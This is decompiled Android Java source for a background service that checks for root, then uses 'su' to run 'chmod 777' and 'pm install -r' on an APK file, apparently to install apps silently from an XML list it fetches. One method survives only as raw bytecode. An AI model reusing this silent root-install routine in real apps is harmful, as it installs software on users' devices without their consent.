package com.yongrun.app.sxmn.service;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;

public class Service_BindApp
  extends Service
{
  private String[] a;
  private String b;
  private String[] c;
  
  public Service_BindApp() {}
  
  public void a(File paramFile)
  {
    Intent localIntent = new Intent("android.intent.action.VIEW");
    localIntent.setDataAndType(Uri.fromFile(paramFile), "application/vnd.android.package-archive");
    localIntent.setFlags(268435456);
    startActivity(localIntent);
  }
  
  public boolean a()
  {
    try
    {
      if (!new File("/system/bin/su").exists())
      {
        boolean bool = new File("/system/xbin/su").exists();
        if (!bool) {
          return false;
        }
      }
      return true;
    }
    catch (Exception localException) {}
    return false;
  }
  
  public boolean a(File paramFile, boolean paramBoolean)
  {
    paramBoolean = true;
    System.out.println(paramFile.getPath());
    System.out.println(paramFile.getPath() + "==");
    try
    {
      Process localProcess = Runtime.getRuntime().exec("su");
      OutputStream localOutputStream = localProcess.getOutputStream();
      DataOutputStream localDataOutputStream = new DataOutputStream(localOutputStream);
      localDataOutputStream.writeBytes("chmod 777 " + paramFile.getPath() + "\n");
      localDataOutputStream.writeBytes("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm install -r " + paramFile.getPath());
      localDataOutputStream.flush();
      localDataOutputStream.close();
      localOutputStream.close();
      int i = localProcess.waitFor();
      if (i == 0) {}
      for (;;)
      {
        if (!paramBoolean) {
          a(paramFile);
        }
        return paramBoolean;
        if (i == 1) {
          paramBoolean = false;
        } else {
          paramBoolean = false;
        }
      }
      return false;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      a(paramFile);
    }
  }
  
  public boolean a(String paramString)
  {
    List localList = getPackageManager().getInstalledPackages(0);
    ArrayList localArrayList = new ArrayList();
    int i;
    if (localList != null) {
      i = 0;
    }
    for (;;)
    {
      if (i >= localList.size()) {
        return localArrayList.contains(paramString);
      }
      localArrayList.add(((PackageInfo)localList.get(i)).packageName);
      i += 1;
    }
  }
  
  /* Error */
  public List<com.yongrun.app.sxmn.c.a> b()
  {
    // Byte code:
    //   0: new 178	com/yongrun/app/sxmn/a
    //   3: dup
    //   4: invokespecial 179	com/yongrun/app/sxmn/a:<init>	()V
    //   7: astore_2
    //   8: new 153	java/util/ArrayList
    //   11: dup
    //   12: invokespecial 154	java/util/ArrayList:<init>	()V
    //   15: astore_3
    //   16: aload_0
    //   17: ldc -75
    //   19: iconst_0
    //   20: invokevirtual 185	com/yongrun/app/sxmn/service/Service_BindApp:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   23: astore 4
    //   25: aload 4
    //   27: ldc -69
    //   29: ldc -67
    //   31: invokeinterface 195 3 0
    //   36: astore 5
    //   38: invokestatic 200	com/yongrun/app/sxmn/common/b:a	()Lcom/yongrun/app/sxmn/common/b;
    //   41: new 74	java/lang/StringBuilder
    //   44: dup
    //   45: ldc -54
    //   47: invokespecial 81	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   50: aload 5
    //   52: invokevirtual 87	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   55: invokevirtual 90	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   58: invokevirtual 205	com/yongrun/app/sxmn/common/b:a	(Ljava/lang/String;)Ljava/lang/String;
    //   61: astore 5
    //   63: aload 5
    //   65: ifnull +287 -> 352
    //   68: new 207	org/xml/sax/InputSource
    //   71: dup
    //   72: new 209	java/io/StringReader
    //   75: dup
    //   76: aload 5
    //   78: invokespecial 210	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   81: invokespecial 213	org/xml/sax/InputSource:<init>	(Ljava/io/Reader;)V
    //   84: pop
    //   85: invokestatic 219	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   88: invokevirtual 223	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   91: new 225	java/io/ByteArrayInputStream
    //   94: dup
    //   95: aload 5
    //   97: invokevirtual 229	java/lang/String:getBytes	()[B
    //   100: invokespecial 232	java/io/ByteArrayInputStream:<init>	([B)V
    //   103: invokevirtual 238	javax/xml/parsers/DocumentBuilder:parse	(Ljava/io/InputStream;)Lorg/w3c/dom/Document;
    //   106: astore 5
    //   108: aload 5
    //   110: ldc -16
    //   112: invokeinterface 246 2 0
    //   117: astore 6
    //   119: iconst_0
    //   120: istore_1
    //   121: iload_1
    //   122: aload 6
    //   124: invokeinterface 251 1 0
    //   129: if_icmplt +229 -> 358
    //   132: aload 5
    //   134: ldc -3
    //   136: invokeinterface 246 2 0
    //   141: astore 6
    //   143: aload 6
    //   145: ifnull +207 -> 352
    //   148: aload 6
    //   150: invokeinterface 251 1 0
    //   155: ifle +197 -> 352
    //   158: aload 6
    //   160: iconst_0
    //   161: invokeinterface 257 2 0
    //   166: checkcast 259	org/w3c/dom/Element
    //   169: ldc_w 261
    //   172: invokeinterface 262 2 0
    //   177: iconst_0
    //   178: invokeinterface 257 2 0
    //   183: invokeinterface 268 1 0
    //   188: invokeinterface 271 1 0
    //   193: astore 5
    //   195: aload_0
    //   196: aload 6
    //   198: iconst_0
    //   199: invokeinterface 257 2 0
    //   204: checkcast 259	org/w3c/dom/Element
    //   207: ldc_w 273
    //   210: invokeinterface 262 2 0
    //   215: iconst_0
    //   216: invokeinterface 257 2 0
    //   221: invokeinterface 268 1 0
    //   226: invokeinterface 271 1 0
    //   231: putfield 275	com/yongrun/app/sxmn/service/Service_BindApp:b	Ljava/lang/String;
    //   234: aload 6
    //   236: iconst_0
    //   237: invokeinterface 257 2 0
    //   242: checkcast 259	org/w3c/dom/Element
    //   245: ldc -69
    //   247: invokeinterface 262 2 0
    //   252: iconst_0
    //   253: invokeinterface 257 2 0
    //   258: invokeinterface 268 1 0
    //   263: invokeinterface 271 1 0
    //   268: astore 6
    //   270: aload_0
    //   271: aload 5
    //   273: ldc_w 277
    //   276: invokevirtual 281	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   279: putfield 283	com/yongrun/app/sxmn/service/Service_BindApp:a	[Ljava/lang/String;
    //   282: aload_0
    //   283: aload 6
    //   285: ldc_w 277
    //   288: invokevirtual 281	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   291: putfield 285	com/yongrun/app/sxmn/service/Service_BindApp:c	[Ljava/lang/String;
    //   294: aload 4
    //   296: invokeinterface 289 1 0
    //   301: astore 4
    //   303: aload 4
    //   305: ldc_w 291
    //   308: aload 5
    //   310: invokeinterface 297 3 0
    //   315: pop
    //   316: aload 4
    //   318: ldc_w 299
    //   321: aload_0
    //   322: getfield 275	com/yongrun/app/sxmn/service/Service_BindApp:b	Ljava/lang/String;
    //   325: invokeinterface 297 3 0
    //   330: pop
    //   331: aload 4
    //   333: ldc_w 301
    //   336: aload 6
    //   338: invokeinterface 297 3 0
    //   343: pop
    //   344: aload 4
    //   346: invokeinterface 304 1 0
    //   351: pop
    //   352: aload_2
    //   353: invokevirtual 306	com/yongrun/app/sxmn/a:a	()V
    //   356: aload_3
    //   357: areturn
    //   358: aload 6
    //   360: iload_1
    //   361: invokeinterface 257 2 0
    //   366: checkcast 259	org/w3c/dom/Element
    //   369: ldc_w 308
    //   372: invokeinterface 262 2 0
    //   377: iconst_0
    //   378: invokeinterface 257 2 0
    //   383: invokeinterface 268 1 0
    //   388: invokeinterface 271 1 0
    //   393: astore 7
    //   395: aload 6
    //   397: iload_1
    //   398: invokeinterface 257 2 0
    //   403: checkcast 259	org/w3c/dom/Element
    //   406: ldc_w 310
    //   409: invokeinterface 262 2 0
    //   414: iconst_0
    //   415: invokeinterface 257 2 0
    //   420: invokeinterface 268 1 0
    //   425: invokeinterface 271 1 0
    //   430: astore 8
    //   432: aload 6
    //   434: iload_1
    //   435: invokeinterface 257 2 0
    //   440: checkcast 259	org/w3c/dom/Element
    //   443: ldc_w 312
    //   446: invokeinterface 262 2 0
    //   451: iconst_0
    //   452: invokeinterface 257 2 0
    //   457: invokeinterface 268 1 0
    //   462: invokeinterface 271 1 0
    //   467: astore 9
    //   469: aload 6
    //   471: iload_1
    //   472: invokeinterface 257 2 0
    //   477: checkcast 259	org/w3c/dom/Element
    //   480: ldc_w 314
    //   483: invokeinterface 262 2 0
    //   488: iconst_0
    //   489: invokeinterface 257 2 0
    //   494: invokeinterface 268 1 0
    //   499: invokeinterface 271 1 0
    //   504: astore 10
    //   506: aload 6
    //   508: iload_1
    //   509: invokeinterface 257 2 0
    //   514: checkcast 259	org/w3c/dom/Element
    //   517: ldc_w 316
    //   520: invokeinterface 262 2 0
    //   525: iconst_0
    //   526: invokeinterface 257 2 0
    //   531: invokeinterface 268 1 0
    //   536: invokeinterface 271 1 0
    //   541: astore 11
    //   543: new 318	com/yongrun/app/sxmn/c/a
    //   546: dup
    //   547: invokespecial 319	com/yongrun/app/sxmn/c/a:<init>	()V
    //   550: astore 12
    //   552: aload 12
    //   554: aload 8
    //   556: invokevirtual 322	com/yongrun/app/sxmn/c/a:d	(Ljava/lang/String;)V
    //   559: aload 12
    //   561: aload 7
    //   563: invokevirtual 324	com/yongrun/app/sxmn/c/a:a	(Ljava/lang/String;)V
    //   566: aload 12
    //   568: aload 9
    //   570: invokevirtual 326	com/yongrun/app/sxmn/c/a:c	(Ljava/lang/String;)V
    //   573: aload 12
    //   575: aload 11
    //   577: invokevirtual 328	com/yongrun/app/sxmn/c/a:b	(Ljava/lang/String;)V
    //   580: aload 12
    //   582: aload 10
    //   584: invokevirtual 331	com/yongrun/app/sxmn/c/a:e	(Ljava/lang/String;)V
    //   587: aload_3
    //   588: aload 12
    //   590: invokeinterface 175 2 0
    //   595: pop
    //   596: iload_1
    //   597: iconst_1
    //   598: iadd
    //   599: istore_1
    //   600: goto -479 -> 121
    //   603: astore_3
    //   604: new 153	java/util/ArrayList
    //   607: dup
    //   608: invokespecial 154	java/util/ArrayList:<init>	()V
    //   611: astore 4
    //   613: aload_3
    //   614: invokevirtual 140	java/lang/Exception:printStackTrace	()V
    //   617: aload_2
    //   618: invokevirtual 306	com/yongrun/app/sxmn/a:a	()V
    //   621: aload 4
    //   623: areturn
    //   624: astore_3
    //   625: aload_2
    //   626: invokevirtual 306	com/yongrun/app/sxmn/a:a	()V
    //   629: aload_3
    //   630: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	631	0	this	Service_BindApp
    //   120	480	1	i	int
    //   7	619	2	localA	com.yongrun.app.sxmn.a
    //   15	573	3	localArrayList	ArrayList
    //   603	11	3	localException	Exception
    //   624	6	3	localObject1	Object
    //   23	599	4	localObject2	Object
    //   36	273	5	localObject3	Object
    //   117	390	6	localObject4	Object
    //   393	169	7	str1	String
    //   430	125	8	str2	String
    //   467	102	9	str3	String
    //   504	79	10	str4	String
    //   541	35	11	str5	String
    //   550	39	12	localA1	com.yongrun.app.sxmn.c.a
    // Exception table:
    //   from	to	target	type
    //   16	63	603	java/lang/Exception
    //   68	119	603	java/lang/Exception
    //   121	143	603	java/lang/Exception
    //   148	352	603	java/lang/Exception
    //   358	596	603	java/lang/Exception
    //   16	63	624	finally
    //   68	119	624	finally
    //   121	143	624	finally
    //   148	352	624	finally
    //   358	596	624	finally
    //   604	617	624	finally
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    new Thread(new a(this, com.yongrun.app.sxmn.common.a.a())).start();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
}
